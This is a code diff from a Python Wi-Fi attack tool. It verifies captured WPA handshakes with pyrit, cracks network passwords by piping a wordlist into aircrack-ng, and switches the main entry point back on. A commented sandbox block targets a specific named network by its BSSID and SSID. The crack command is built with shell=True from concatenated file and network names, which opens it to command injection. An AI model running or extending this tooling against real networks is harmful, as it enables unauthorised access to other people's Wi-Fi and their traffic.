@@ -369,7 +369,7 @@ def verifyHandshake(BSSID,target):
     process_1 = sp.run(command, capture_output=True, text=True)
     pyrit = process_1.stdout
     if pyrit.__contains__('good'):
-        print(Fore.LIGHTGREEN_EX, '\n+--------------------+')
+        print(Fore.LIGHTGREEN_EX, '\n +--------------------+')
         print(Fore.LIGHTGREEN_EX, '| PASSWORD CAPTURED! |')
         print(Fore.LIGHTGREEN_EX, '+--------------------+\n')
         monitorToggle(getInterface(0),1)
@@ -380,7 +380,7 @@ def verifyHandshake(BSSID,target):
 
 def crackPassword(file,target):
     Name = target[3]
-    capFile = 'captures/'+file
+    capFile = file
     command = 'python3 wordlist.py | aircrack-ng -w - '+ capFile + ' -e ' + Name
     crackProc = sp.Popen(command, shell=True)
 
@@ -391,11 +391,11 @@ def start():
 
 # Main function calls
 welcome()       # prints title
-# start()         # Start the process/function/procedure tree
+start()         # Start the process/function/procedure tree
 
 # -------SANDBOX--------
-filename = 'capture_7C:DB:98:B4:5D:59_MySpectrumWiFi5B-2G-01.cap'
-targetlist = ['7C:DB:98:B4:5D:59', '-54', '10', 'MySpectrumWiFi5B-2G']
-crackPassword(filename,targetlist)
+# filename = 'captures/capture_7C:DB:98:B4:5D:59_MySpectrumWiFi5B-2G-05.cap'
+# targetlist = ['7C:DB:98:B4:5D:59', '-54', '10', 'MySpectrumWiFi5B-2G']
+# crackPassword(filename,targetlist)
 
 # captures/capture_7C:DB:98:B4:5D:59_MySpectrumWiFi5B-2G-01.cap
